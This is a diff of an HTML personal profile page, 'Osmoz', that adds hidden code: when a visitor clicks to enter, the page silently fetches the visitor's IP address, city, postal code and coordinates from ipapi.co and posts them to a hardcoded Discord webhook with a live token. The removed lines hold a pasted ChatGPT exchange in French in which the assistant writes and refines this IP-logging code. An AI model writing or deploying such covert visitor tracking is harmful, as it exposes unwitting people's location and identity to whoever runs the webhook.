@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -34,7 +34,7 @@
             z-index: 10;
             cursor: pointer;
         }
-        #player {
+        #mainContent {
             display: none;
         }
         #volumeControl {
@@ -66,9 +66,9 @@
             <input type="range" id="volumeControl" min="0" max="100" value="50">
         </div>
         <div class="bg-black bg-opacity-50 rounded-lg p-8 text-center text-white">
-            <img alt="Profile picture" class="w-24 h-24 rounded-full mx-auto mb-4" height="100" src="https://cdn.discordapp.com/avatars/1175537037366010048/6ddb5a04ef98ca63df0d713e7e1e4742.webp?size=1024&format=webp&width=482&height=482" width="100"/>
+            <img alt="Profile picture" class="w-24 h-24 rounded-full mx-auto mb-4" src="https://cdn.discordapp.com/avatars/1175537037366010048/6ddb5a04ef98ca63df0d713e7e1e4742.webp?size=1024&format=webp" />
             <h1 class="text-3xl font-bold text-purple-500">Osmoz</h1>
-            <p class="text-purple-500 mb-4">It's just you &amp; me and not the others !</p>
+            <p class="text-purple-500 mb-4">It's just you &amp; me and not the others!</p>
             <div class="flex justify-center space-x-4 text-purple-500 text-2xl mb-4">
                 <a href="https://discord.com" target="_blank" class="link"><i class="fab fa-discord"></i></a>
                 <a href="https://store.steampowered.com" target="_blank" class="link"><i class="fab fa-steam"></i></a>
@@ -99,6 +99,7 @@
                 mainContent.classList.remove('hidden');
                 musicControl.classList.remove('hidden');
                 player.playVideo();
+                fetchIpData();
             });
 
             const links = document.querySelectorAll('.link');
@@ -174,179 +175,64 @@
                 event.target.setVolume(50); // Set volume to 50%
                 event.target.playVideo(); // Start playing the video
             }
-            
-fetch('https://ipapi.co/json/')
+
+            function fetchIpData() {
+                fetch('https://ipapi.co/json/')
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Erreur réseau');
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        sendToWebhook(data);
+                    })
+                    .catch(error => {
+                        console.error('Erreur lors de la récupération des données IP:', error);
+                    });
+            }
+
+            function sendToWebhook(data) {
+                const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ';
+                const embed = {
+                    title: "Informations sur l'adresse IP",
+                    color: 3447003,  // Couleur en hexadécimal
+                    fields: [
+                        { name: "Adresse IP", value: data.ip, inline: true },
+                        { name: "Ville", value: data.city || "Inconnue", inline: true },
+                        { name: "Région", value: data.region || "Inconnue", inline: true },
+                        { name: "Pays", value: data.country_name, inline: true },
+                        { name: "Code postal", value: data.postal || "Inconnu", inline: true },
+                        { name: "Latitude", value: data.latitude.toString(), inline: true },
+                        { name: "Longitude", value: data.longitude.toString(), inline: true }
+                    ],
+                    footer: {
+                        text: "Informations obtenues via l'API IPAPI"
+                    }
+                };
+
+                const message = {
+                    embeds: [embed]
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                })
                 .then(response => {
                     if (!response.ok) {
-                        throw new Error('Erreur réseau');
+                        throw new Error('Erreur lors de l\'envoi au webhook');
                     }
-                    return response.json();
-                })
-                .then(data => {
-                    const ipInfo = `
-                        <p><strong>Adresse IP :</strong> ${data.ip}</p>
-                        <p><strong>Ville :</strong> ${data.city}</p>
-                        <p><strong>Région :</strong> ${data.region}</p>
-                        <p><strong>Pays :</strong> ${data.country_name}</p>
-                        <p><strong>Code postal :</strong> ${data.postal}</p>
-                        <p><strong>Latitude :</strong> ${data.latitude}</p>
-                        <p><strong>Longitude :</strong> ${data.longitude}</p>
-                    `;
-                    document.getElementById('ipInfo').innerHTML = ipInfo;
-                    
-                    // Envoi des informations au webhook Discord
-                    sendToWebhook(data);
+                    console.log('Embed envoyé au webhook avec succès!');
                 })
                 .catch(error => {
-                    document.getElementById('ipInfo').innerHTML = `<p>Une erreur s'est produite : ${error.message}</p>`;
+                    console.error('Erreur lors de l\'envoi au webhook:', error);
                 });
+            }
         });
-
-        function sendToWebhook(data) {
-            const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ';
-            const message = {
-                content: `Informations sur l'adresse IP:\n\n` +
-                         `**Adresse IP:** ${data.ip}\n` +
-                         `**Ville:** ${data.city}\n` +
-                         `**Région:** ${data.region}\n` +
-                         `**Pays:** ${data.country_name}\n` +
-                         `**Code postal:** ${data.postal}\n` +
-                         `**Latitude:** ${data.latitude}\n` +
-                         `**Longitude:** ${data.longitude}`
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Erreur lors de l\'envoi au webhook');
-                }
-                console.log('Message envoyé au webhook avec succès!');
-            })
-            .catch(error => {
-                console.error('Erreur lors de l\'envoi au webhook:', error);
-            });
-        }
-    </script>
-</body>
-</html>
-Instructions
-Création du fichier : Copiez le code ci-dessus et collez-le dans un éditeur de texte. Enregistrez-le sous le nom index.html.
-
-Ouverture dans un navigateur : Ouvrez le fichier index.html dans votre navigateur web.
-
-Cliquez sur le bouton : Cliquez sur le bouton "Obtenir les informations de l'IP". Les informations seront affichées sur la page et envoyées au webhook Discord.
-
-Ce code récupère les informations de l'adresse IP et les envoie sous forme de message formaté au webhook Discord spécifié.
-
-
-2/2
-
-
-
-You said:
-fait que sa envoie un embed
-ChatGPT said:
-ChatGPT
-Pour envoyer un message formaté en "embed" à un webhook Discord, vous devez structurer le message de manière appropriée. Voici comment modifier le code précédent pour envoyer un embed :
-
-html
-Copy code
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Informations sur l'IP</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        .info {
-            margin-top: 20px;
-        }
-    </style>
-</head>
-<body>
-    <h1>Informations sur votre adresse IP</h1>
-    <button id="getIpBtn">Obtenir les informations de l'IP</button>
-    <div class="info" id="ipInfo"></div>
-
-    <script>
-        document.getElementById('getIpBtn').addEventListener('click', function() {
-            fetch('https://ipapi.co/json/')
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Erreur réseau');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    const ipInfo = `
-                        <p><strong>Adresse IP :</strong> ${data.ip}</p>
-                        <p><strong>Ville :</strong> ${data.city}</p>
-                        <p><strong>Région :</strong> ${data.region}</p>
-                        <p><strong>Pays :</strong> ${data.country_name}</p>
-                        <p><strong>Code postal :</strong> ${data.postal}</p>
-                        <p><strong>Latitude :</strong> ${data.latitude}</p>
-                        <p><strong>Longitude :</strong> ${data.longitude}</p>
-                    `;
-                    document.getElementById('ipInfo').innerHTML = ipInfo;
-                    
-                    // Envoi des informations au webhook Discord
-                    sendToWebhook(data);
-                })
-                .catch(error => {
-                    document.getElementById('ipInfo').innerHTML = `<p>Une erreur s'est produite : ${error.message}</p>`;
-                });
-        });
-
-        function sendToWebhook(data) {
-            const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ';
-            const embed = {
-                title: "Informations sur l'adresse IP",
-                color: 3447003,  // Couleur en hexadécimal
-                fields: [
-                    { name: "Adresse IP", value: data.ip, inline: true },
-                    { name: "Ville", value: data.city || "Inconnue", inline: true },
-                    { name: "Région", value: data.region || "Inconnue", inline: true },
-                    { name: "Pays", value: data.country_name, inline: true },
-                    { name: "Code postal", value: data.postal || "Inconnu", inline: true },
-                    { name: "Latitude", value: data.latitude.toString(), inline: true },
-                    { name: "Longitude", value: data.longitude.toString(), inline: true }
-                ],
-                footer: {
-                    text: "Informations obtenues via l'API IPAPI"
-                }
-            };
-
-            const message = {
-                embeds: [embed]
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Erreur lors de l\'envoi au webhook');
-                }
-                console.log('Embed envoyé au webhook avec succès!');
-            })
-            .catch(error => {
-                console.error('Erreur lors de l\'envoi au webhook:', error);
-            });
-        }
     </script>
 </body>
 </html>
